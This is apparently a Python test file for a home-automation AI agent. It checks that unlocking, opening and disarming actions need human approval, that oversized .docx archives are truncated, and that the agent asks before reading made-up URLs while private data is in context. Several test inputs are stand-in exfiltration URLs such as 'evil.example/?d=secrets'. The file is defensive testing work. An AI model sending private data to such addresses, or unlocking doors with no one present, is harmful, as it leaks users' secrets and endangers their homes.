"""What always asks, whatever tool an agent was given: actions that could unlock, open or disarm, and (for agents) things
that could do anything, or a made-up address next to private data."""
import asyncio
import unittest
from unittest import mock

import support  # noqa: F401
from second_thought.agent import AgentTools as Agent
from second_thought.core import ha_sensitive


class Sensitive(unittest.TestCase):
    def test_opening_and_unlocking_always_ask(self):
        for service, entity in [("lock.unlock", "lock.front_door"), ("lock.open", ""), ("cover.open_cover", "cover.garage_door"),
                                ("cover.toggle", "cover.garage_door"), ("cover.set_cover_position", "cover.gate"), ("valve.toggle", ""),
                                ("valve.open_valve", ""), ("alarm_control_panel.alarm_disarm", ""), ("homeassistant.toggle", "lock.front_door"),
                                ("homeassistant.turn_on", "light.hall, cover.garage_door")]:
            self.assertTrue(ha_sensitive(service, entity), f"{service} on {entity}")

    def test_closing_locking_and_everyday_actions_dont(self):
        for service, entity in [("lock.lock", "lock.front_door"), ("cover.close_cover", "cover.garage_door"), ("cover.stop_cover", ""),
                                ("valve.close_valve", ""), ("alarm_control_panel.alarm_arm_away", ""), ("light.turn_on", "light.kitchen"),
                                ("homeassistant.toggle", "light.kitchen"), ("switch.turn_off", "switch.oven")]:
            self.assertFalse(ha_sensitive(service, entity), f"{service} on {entity}")


    def test_the_target_in_the_data_counts_too(self):
        # #303: the generic services judged on the whole call, not just the entity input
        for entity, data in [("", '{"entity_id": "lock.front_door"}'), ("", {"entity_id": ["light.hall", "cover.garage_door"]}),
                             ("", '{"area_id": "hallway"}'), ("", {"device_id": ["abc"]}), ("", '{"floor_id": "ground"}'),
                             ("", {"label_id": "doors"}), ("", {"target": {"area_id": "hallway"}}), ("", '{"entity_id": "all"}'),
                             ("", ""), ("", "{}"), ("light.hall", {"target": {"entity_id": "lock.back_door"}})]:
            self.assertTrue(ha_sensitive("homeassistant.toggle", entity, data), f"{entity} {data}")
        for entity, data in [("light.hall", '{"brightness": 120}'), ("", {"entity_id": "light.hall"}), ("", {"entity_id": ["switch.a", "fan.b"]}),
                             ("", {"target": {"entity_id": "light.hall"}, "area_id": ""})]:
            self.assertFalse(ha_sensitive("homeassistant.turn_on", entity, data), f"{entity} {data}")
        # Everyday services keep their area targets without asking; sensitive ones asked already.
        self.assertFalse(ha_sensitive("light.turn_on", "", '{"area_id": "hallway"}'))
        self.assertTrue(ha_sensitive("cover.open_cover", "", '{"area_id": "hallway"}'))


class ServiceCall(unittest.TestCase):
    """#303 end to end: a lock named only in the data isn't sent when nobody is there to ask."""
    def call(self, service, entity, data):
        from second_thought.runtime import Runtime
        rt = Runtime()
        sent = mock.AsyncMock(return_value={})
        with mock.patch.object(rt, "nobody_here", return_value=True), mock.patch.object(rt, "_allowed", mock.AsyncMock(return_value=True)), \
                mock.patch.object(rt, "_ha", sent), mock.patch.object(rt, "log"):
            done = asyncio.run(rt._ha_call_live(service, entity, data))
        return done, sent.await_count

    def test_lock_in_the_data_is_refused_unattended(self):
        self.assertEqual(self.call("homeassistant.toggle", "", '{"entity_id": "lock.front_door"}'), (False, 0))
        self.assertEqual(self.call("homeassistant.turn_on", "", '{"area_id": "hallway"}'), (False, 0))

    def test_everyday_call_still_goes(self):
        self.assertEqual(self.call("homeassistant.turn_on", "", '{"entity_id": "light.hall"}'), (True, 1))


class WordFiles(unittest.TestCase):
    def test_a_small_file_that_unpacks_huge_is_cut_short(self):
        # #304: a few hundred KB of .docx can unpack to gigabytes; at most 25 MB is read
        import os
        import tempfile
        import zipfile
        from second_thought.core import _read_text_file
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "big.docx")
            with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
                z.writestr("word/document.xml", "<w:p><w:t>a</w:t></w:p>" * 1_500_000)  # 36 MB unpacked
            self.assertLess(os.path.getsize(path), 1_000_000)
            text = _read_text_file(path)
        self.assertLessEqual(len(text), 25 * 1024 * 1024)
        self.assertTrue(text.startswith("a\na\n"))


class AgentMustAsk(unittest.TestCase):
    def ask(self, tool, inp, seen="", private=True):
        return Agent._agent_must_ask(Agent, tool, inp, seen, private)

    def test_things_that_could_do_anything(self):
        for service in ("script.turn_on", "script.unlock_front_door", "scene.turn_on", "automation.trigger", "button.press", "input_button.press"):
            self.assertTrue(self.ask("call_service", {"service": service}), service)
        self.assertFalse(self.ask("call_service", {"service": "light.turn_on"}))
        self.assertFalse(self.ask("call_service", {"service": "automation.turn_off"}))
        self.assertTrue(self.ask("run_homey_flow", {"flow": "Good night"}))

    def test_mqtt_unlock_messages(self):
        self.assertTrue(self.ask("publish_mqtt", {"topic": "zigbee2mqtt/front_door_lock/set", "message": '{"state": "UNLOCK"}'}))
        self.assertTrue(self.ask("publish_mqtt", {"topic": "home/garage/open", "message": "1"}))
        self.assertFalse(self.ask("publish_mqtt", {"topic": "zigbee2mqtt/kitchen_light/set", "message": "ON"}))

    def test_made_up_addresses_next_to_private_data(self):
        seen = "Goal\nRead https://example.com/news/1 and https://example.com/a/"
        self.assertTrue(self.ask("read_page", {"url": "https://evil.example/?d=secrets"}, seen))
        self.assertFalse(self.ask("read_page", {"url": "https://example.com/news/1"}, seen), "an address it read doesn't ask")
        self.assertFalse(self.ask("read_page", {"url": "https://example.com/a"}, seen), "nor the same address without its last slash")
        self.assertTrue(self.ask("read_feed", {"url": "https://evil.example/feed?d=x"}, seen))
        self.assertFalse(self.ask("read_feed", {"url": ""}, seen), "your own feeds don't ask")
        self.assertFalse(self.ask("read_page", {"url": "https://evil.example/?d=x"}, seen, private=False), "nothing private: no need to ask")

    def test_only_whole_addresses_count(self):
        # #304: a piece of an address it read is still made up
        seen = "Goal\nSee https://example.com/collect?d=123456. Also (https://example.com/wiki/Foo_(bar)), and https://example.com/x/"
        self.assertTrue(self.ask("read_page", {"url": "https://example.com/collect?d=123"}, seen))
        self.assertTrue(self.ask("read_page", {"url": "https://example.com/coll"}, seen))
        self.assertFalse(self.ask("read_page", {"url": "https://example.com/collect?d=123456"}, seen), "the full stop isn't part of it")
        self.assertFalse(self.ask("read_page", {"url": "https://example.com/wiki/Foo_(bar)"}, seen), "brackets inside an address are kept")
        self.assertFalse(self.ask("read_page", {"url": "https://example.com/x"}, seen))
        self.assertTrue(self.ask("read_page", {"url": "https://example.com/collect?d=123456&more=1"}, seen))


if __name__ == "__main__":
    unittest.main()
